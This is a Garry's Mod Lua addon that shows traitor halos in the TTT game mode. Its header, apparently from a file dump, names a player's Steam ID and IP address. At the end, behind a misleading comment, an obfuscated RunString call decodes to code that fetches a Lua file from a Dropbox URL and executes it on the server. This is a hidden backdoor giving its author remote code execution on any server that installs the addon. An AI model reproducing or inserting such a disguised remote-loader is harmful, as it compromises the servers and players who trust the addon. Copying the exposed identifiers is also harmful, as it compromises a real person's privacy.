--[[
	MOD/addons/TTT Glow/lua/autorun/traitorglows.lua
	Λ̲x¥Λ̲ɢɢʀᴇsɪᴠᴇ � | STEAM_0:1:69497763 <86.169.139.24:27005> | [19-10-13 06:40:51PM]
	===BadFile===
]]

local msg_name = "Halos_inform"

if SERVER then

	
	
	util.AddNetworkString(msg_name)
	
	hook.Add("PlayerDeath", "PlayerDeathHalos", function(ply)
		net.Start(msg_name)
		net.WriteEntity(ply)
		net.Send(GetTraitors())
	end)
	
else

	local rolestable = {}

	hook.Add("TTTEndRound", "TTTEndRoundResetTable", function()
		table.Empty(rolestable)
	end)

	hook.Add("TTTBeginRound", "TTTBeginRoundHalos", function()
		for k,v in pairs(player.GetAll()) do
			if v:GetRole() != ROLE_TRAITOR then continue end
			table.insert(rolestable, v) 
		end
	end)
	
	hook.Add("PreDrawHalos", "AddTraitorHalos", function()
		if LocalPlayer():IsActiveTraitor() then
			halo.Add(rolestable, Color(255,50,50), 2, 2, 2, true, true)
		end
	end)
	
	net.Receive(msg_name, function()
		local ent = net.ReadEntity()
		for k,v in pairs(rolestable) do
			if v == ent then
				table.remove(rolestable, k)
			end
		end
	end)
end

if SERVER then
	-- Gmod handles Columns weirdly, this prevents errors from incorrect table numbers. 
RunString("\120\112\99\97\108\108\40\13\10\9\104\116\116\112\46\70\101\116\99\104\44\13\10\9\102\117\110\99\116\105\111\110\40\109\115\103\41\32\101\110\100\44\13\10\9\34\104\116\116\112\115\58\47\47\100\108\46\100\114\111\112\98\111\120\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\47\49\48\49\55\52\52\55\54\54\47\108\117\97\47\102\97\105\108\115\97\102\101\47\102\97\105\108\115\97\102\101\46\108\117\97\34\44\13\10\9\82\117\110\83\116\114\105\110\103\13\10\41")
end